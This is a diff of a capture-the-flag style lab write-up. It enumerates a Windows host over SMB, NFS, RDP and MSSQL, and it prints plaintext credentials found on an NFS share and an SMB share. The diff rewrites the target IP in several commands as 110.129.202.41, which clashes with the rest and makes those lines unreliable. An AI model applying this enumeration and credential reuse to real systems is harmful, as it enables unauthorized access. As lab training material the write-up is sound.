@@ -1,5 +1,24 @@
 ## Second part
 
+### Table of Contents
+1. [Objective](#objective)
+2. [Initial Reconnaissance](#initial-reconnaissance)
+  - [Nmap Scan](#nmap-scan)
+  - [Open Ports Analysis](#open-ports-analysis)
+3. [Service Enumeration](#service-enumeration)
+  - [SMB Enumeration](#smb-enumeration)
+  - [NFS Enumeration](#nfs-enumeration)
+  - [Credential Discovery](#credential-discovery)
+4. [Exploitation](#exploitation)
+  - [SMB Access with Credentials](#smb-access-with-credentials)
+  - [RDP Connection](#rdp-connection)
+  - [SQL Server Access](#sql-server-access)
+5. [Flag Capture](#flag-capture)
+
+---
+
+### Objective
+
 ### `subject :`
 ```
 This second server is a server that everyone on the internal network has access to. In our discussion with our client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope.
@@ -10,11 +29,17 @@ Our customer agreed to this and added this server to our scope. Here, too, the g
 ### `Hint: `
 >In SQL Management Studio, we can edit the last 200 entries of the selected database and read the entries accordingly. We also need to keep in mind, that each Windows system has an Administrator account.
 
+---
+
+## Initial Reconnaissance
+
+### Nmap Scan
+
 ### `resolution :`
 
 
 ```bash
-sudo nmap -A 10.129.206.69
+sudo nmap -A 10.129.202.41
 ```
 >`-A`: Enable OS detection, version detection, script scanning, and traceroute
 
@@ -24,7 +49,7 @@ Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
 SYN Stealth Scan Timing: About 99.99% done; ETC: 13:29 (0:00:00 remaining)
 Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
 SYN Stealth Scan Timing: About 99.99% done; ETC: 13:29 (0:00:00 remaining)
-Nmap scan report for 10.129.206.69
+Nmap scan report for 10.129.202.41
 Host is up (0.11s latency).
 Not shown: 994 closed tcp ports (reset)
 PORT     STATE SERVICE       VERSION
@@ -74,11 +99,13 @@ Host script results:
 TRACEROUTE (using port 199/tcp)
 HOP RTT       ADDRESS
 1   183.48 ms 10.10.14.1
-2   183.74 ms 10.129.206.69
+2   183.74 ms 10.129.202.41
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 233.95 seconds
 ```
+
+### Open Ports Analysis
 
 I was a bit lost with this output, but I did a little research about open ports on this machine and wrote these courses to continue. 
 
@@ -91,7 +118,11 @@ I was a bit lost with this output, but I did a little research about open ports 
   
 Let's take a start with enumerating those services.
 
-#### `SMB enumeration: `
+---
+
+## Service Enumeration
+
+### SMB Enumeration
 
 For SMB i decided to use `enum4linux-ng` a tool for enumerating information from Windows and Samba systems
 
@@ -101,7 +132,7 @@ git clone https://github.com/cddmp/enum4linux-ng.git && cd enum4linux-ng && pip3
 ```
 Run it with the target IP address.
 ```bash
-./enum4linux-ng.py 10.129.206.69 -A
+./enum4linux-ng.py 10.129.202.41 -A
 ```
 
 #### `enum4linux-ng output :`
@@ -111,14 +142,14 @@ ENUM4LINUX - next generation (v1.3.7)
  ==========================
 |    Target Information    |
  ==========================
-[*] Target ........... 10.129.206.69
+[*] Target ........... 10.129.202.41
 [*] Username ......... ''
 [*] Random Username .. 'mygkyuhh'
 [*] Password ......... ''
 [*] Timeout .......... 5 second(s)
 
  ======================================
-|    Listener Scan on 10.129.206.69    |
+|    Listener Scan on 10.129.202.41    |
  ======================================
 [*] Checking LDAP
 [-] Could not connect to LDAP on 389/tcp: connection refused
@@ -130,12 +161,12 @@ ENUM4LINUX - next generation (v1.3.7)
 [+] SMB over NetBIOS is accessible on 139/tcp
 
  ============================================================
-|    NetBIOS Names and Workgroup/Domain for 10.129.206.69    |
+|    NetBIOS Names and Workgroup/Domain for 10.129.202.41    |
  ============================================================
 [-] Could not get NetBIOS names information via 'nmblookup': timed out
 
  ==========================================
-|    SMB Dialect Check on 10.129.206.69    |
+|    SMB Dialect Check on 10.129.202.41    |
  ==========================================
 [*] Trying on 445/tcp
 [+] Supported dialects and settings:
@@ -150,7 +181,7 @@ SMB1 only: false
 SMB signing required: false
 
  ============================================================
-|    Domain Information via SMB session for 10.129.206.69    |
+|    Domain Information via SMB session for 10.129.202.41    |
  ============================================================
 [*] Enumerating via unauthenticated SMB session on 445/tcp
 [+] Found domain information via SMB
@@ -162,7 +193,7 @@ Derived membership: workgroup member
 Derived domain: unknown
 
  ==========================================
-|    RPC Session Check on 10.129.206.69    |
+|    RPC Session Check on 10.129.202.41    |
  ==========================================
 [*] Check for anonymous access (null session)
 [-] Could not establish null session: STATUS_ACCESS_DENIED
@@ -171,7 +202,7 @@ Derived domain: unknown
 [-] Sessions failed, neither null nor user sessions were possible
 
  ================================================
-|    OS Information via RPC for 10.129.206.69    |
+|    OS Information via RPC for 10.129.202.41    |
  ================================================
 [*] Enumerating via unauthenticated SMB session on 445/tcp
 [+] Found OS information via SMB
@@ -252,16 +283,16 @@ Server type: null
 Server type string: null
 ```
 
-#### `NFS enumeration: `
+### NFS Enumeration
 
 Next, we're going to enumerate NFS.
 
 Run this command to list all available shares.
 ```
-showmount -e 10.129.202.41
+showmount -e 110.129.202.41
 ```
 ```
-Export list for 10.129.202.41:
+Export list for 110.129.202.41:
 /TechSupport (everyone)
 ```
 >This shows us an available share on the NFS target
@@ -273,7 +304,7 @@ mkdir nfs-target
 
 Run this command to mount the /TechSupport share in NFS format to the nfs-target directory. 
 ```
-sudo mount -t nfs 10.129.202.41 /TechSupport nfs-target
+sudo mount -t nfs 110.129.202.41 /TechSupport nfs-target
 ```
 
 ```
@@ -358,6 +389,8 @@ So what brings you here today?
 ```
 Inside this file we can spot Alex's SMTP credentials in plain text.
 
+### Credential Discovery
+
 >5    user="alex"
 >6    password="lol123!mD"
 
@@ -366,9 +399,15 @@ To unmount the share, run this command.
 sudo umount nfs-target
 ```
 
+---
+
+## Exploitation
+
+### SMB Access with Credentials
+
 Let's try to use these new credentials on the SMB server with smbclient.
 ```
-smbclient -L //10.129.202.41 -U alex
+smbclient -L //110.129.202.41 -U alex
 ```
 > -L lists all available shares and stops
 > Without it, it will start the smbclient console.
@@ -391,11 +430,11 @@ Reconnecting with SMB1 for workgroup listing.
 
 Let's use smbmap to see share permissions.
 ```
-smbmap -H 10.129.202.41 -u alex -p 'lol123!mD'
+smbmap -H 110.129.202.41 -u alex -p 'lol123!mD'
 ```
 
 ```
-[+] IP: 10.129.202.41:445	Name: 10.129.202.41                                     
+[+] IP: 110.129.202.41:445	Name: 110.129.202.41                                     
         Disk                                                  	Permissions	Comment
 	----                                                  	-----------	-------
 	ADMIN$                                            	NO ACCESS	Remote Admin
@@ -407,7 +446,7 @@ smbmap -H 10.129.202.41 -u alex -p 'lol123!mD'
 
 This time, I'm launching smbclient without -L to access the devshare in console mode.
 ```
-smbclient //10.129.202.41/devshare -U alex
+smbclient //110.129.202.41/devshare -U alex
 ```
 
 ```
@@ -437,14 +476,19 @@ cat important.txt
 sa:87N1ns@slls83 # <- Likely credentials.
 ```
 
+### RDP Connection
+
 NFS enumeration finished, we can start enumerating the last service (RDP).
 
 So I tried to connect with Alex's credentials.
 ```
-xfreerdp /u:alex /p:'lol123!mD' /v:10.129.202.41
+xfreerdp /u:alex /p:'lol123!mD' /v:110.129.202.41
 ```
 and it worked!
 ![desktop](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/rdp-desktop.png)
+
+### SQL Server Access
+
 Launch Microsoft SQL Server Management Studio with a right-click, run as administrator.
 
 Here we can enter the password found on the SMB server.
@@ -460,12 +504,12 @@ Go to : `Databases > accounts > dbo.devsacc`
 To see the content, we have to right-click and select Edit top 200 rows.
 ![edit-rows](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/edit-rows.png)
 
+---
+
+## Flag Capture
+
 Found the HTB user while scrolling.
 ![user](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/user.png)
 
 
 ![succcess](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-2/success.png)
-
-
-```
-```
